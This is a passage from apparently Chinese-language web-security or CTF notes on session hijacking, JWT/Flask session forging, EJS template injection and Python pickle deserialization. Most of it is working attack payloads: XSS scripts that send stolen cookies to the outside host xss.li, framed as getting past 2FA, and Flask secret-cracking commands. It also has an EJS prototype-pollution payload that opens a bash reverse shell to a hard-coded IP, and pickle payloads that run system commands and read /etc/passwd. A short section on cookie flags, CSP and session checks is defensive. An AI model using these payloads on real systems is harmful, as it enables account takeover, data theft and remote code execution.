            timestamp: Date.now()
        }));
        lastCookie = currentCookie;
    }
}, 5000);

var lastCookie = document.cookie;
</script>
3.3 绕过双因素认证
即使网站使用2FA，窃取的Session Cookie仍可能有效：

// 窃取已完成2FA验证的Session
<script>
// 等待用户完成2FA
setTimeout(function() {
    // 此时Session已包含2FA验证状态
    fetch('https://xss.li/api/collect', {
        method: 'POST',
        body: JSON.stringify({
            cookie: document.cookie,
            authenticated: true,
            twoFactorPassed: true
        })
    });
}, 30000); // 等待30秒
</script>

 四、防御措施
4.1 Cookie安全配置
// 设置安全的Cookie
Set-Cookie: sessionid=abc123; 
    Path=/; 
    Domain=.example.com; 
    Secure;              // 仅HTTPS传输
    HttpOnly;            // 禁止JS访问
    SameSite=Strict;     // 防CSRF
    Max-Age=3600         // 1小时过期
4.2 输入输出过滤
// PHP示例
function sanitize($input) {
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}

// 输出时转义
echo sanitize($_GET['name']);
4.3 内容安全策略(CSP)
<!-- 添加CSP头 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'nonce-random123'">
4.4 会话管理最佳实践
登录后重新生成Session ID
设置合理的Session超时时间
验证User-Agent和IP地址（可选）
实现会话绑定（Session Binding）
记录会话活动日志
4.5 检测会话劫持
// PHP检测异常会话
session_start();

// 检查IP地址变化
if (isset($_SESSION['ip']) && $_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
    session_destroy();
    die('会话异常，请重新登录');
}
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];

// 检查User-Agent变化
if (isset($_SESSION['ua']) && $_SESSION['ua'] !== $_SERVER['HTTP_USER_AGENT']) {
    session_destroy();
    die('会话异常，请重新登录');
}
$_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];


```

## jwt伪造
### 使用https://www.jwt.io/
### flask_session_cookie_manager
生成session:

python3 flask_session_cookie_manager3.py encode -s 'hello' -t '{"username":"lbz"}'

已知secret_key破解session:

python3 flask_session_cookie_manager3.py decode -s 'hello' -c 'eyJ1c2VybmFtZSI6ImxieiJ9.ZoO6sQ.1qmeqKQDnxZyPqeCWGtw_50wWss'



flask-unsign

这个工具比上一个多了自动爆破秘钥的功能,而且是添加到pip包管理器中的,可以直接使用

破解秘钥并解密:

flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6ImxieiJ9.ZoO6sQ.1qmeqKQDnxZyPqeCWGtw_50wWss'

破解秘钥并输出秘钥:

flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImxieiJ9.ZoO6sQ.1qmeqKQDnxZyPqeCWGtw_50wWss'

### jwt_GUI
<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-016.png)

### jwtcrack
```plain
./jwtcrack 
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/php/img-017.png)

### 
## JAVA
在 JS 捆绑包中搜索 、 、 未公开的端点。/api/internal//api/admin/

### Ejs模板引擎
注入实现RCE

EJS是一个javascript模板库，用来从json数据中生成HTML字符串

<% code %>用来执行javascript代码

所有使用 `<% %>`  括起来的内容都会被编译成 Javascript，可以在模版文件中像写js一样Coding

用`<%=...%>`输出变量，变量若包含 `'<' '>' '&'`等字符会被转义，如果不希望变量值的内容被转义，那就这么用`<%-... %>`输出变量

```plain
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').execSync('calc');var __tmp2"}}

{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec('calc');var __tmp2"}}


{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/120.77.200.94/8888 0>&1\"');var __tmp2"}}

执行<%=global.process.mainModule.require('child_process').execSync('env')%>
```

## <font style="color:rgb(0, 0, 0);background-color:rgba(255, 255, 255, 0.5);">Pickle反序列化</font>
```plain
import pickle, os
class Evil:
   def __reduce__(self):
       return (os.system, ('id',))
payload = pickle.dumps(Evil())
pickle.loads(payload) # 反序列化时执行 id


```

```plain
import pickle

class A(object):
    def __reduce__(self):
        return (eval,("__import__('os').system('whoami')",))
a = A()
print(pickle.dumps(a))
pickle.loads(pickle.dumps(a))

```

```plain
import pickle, base64
class Evil:
   def __reduce__(self):
       return (eval, ("__import__('os').popen('whoami').read()",))
payload = pickle.dumps(Evil())
print(base64.b64encode(payload).decode())
```

```plain
getattr = GLOBAL('builtins','getattr')
dict = GLOBAL('builtins','dict')
dict_get = getattr(dict,'get')
globals_dict = GLOBAL('builtins','globals')()
builtins = dict_get(globals_dict,'builtins')
eval = getattr(builtins,'eval')
return eval('import("os").system("ls")')
```

```plain
return GLOBAL('builtins','__getattribute__')('eval')('__import__("os").system("ls")')

```

```plain
__dict__ = GLOBAL('structs', '__dict__')
builtins = GLOBAL('structs', '__builtins__')
gtat = GLOBAL('structs', '__getattribute__')
builtins['__import__'] = gtat
__dict__['structs'] = builtins
builtin_get = GLOBAL('structs', 'get')
eval = builtin_get('eval')
eval('print(open("/etc/passwd").read())')
return
```

```plain
getattr = GLOBAL('builtins', 'getattr')
dict = GLOBAL('builtins', 'dict')
dict_get = getattr(dict, 'get')
globals = GLOBAL('builtins', 'globals')
builtins = globals()
__builtins__ = dict_get(builtins, '__builtins__')
eval = getattr(__builtins__, 'eval')
eval('__import__("os").system("whoami")')
return
```

```plain
getattr = GLOBAL('builtins', 'getattr')
dict = GLOBAL('builtins', 'dict')
dict_get = OBJ(getattr, dict, 'get')
globals = GLOBAL('builtins', 'globals')
builtins = OBJ(globals)
__builtins__ = OBJ(dict_get, builtins, '__builtins__')
eval = OBJ(getattr,__builtins__, 'eval')
return OBJ(eval,'__import__("os").system("whoami")')
```

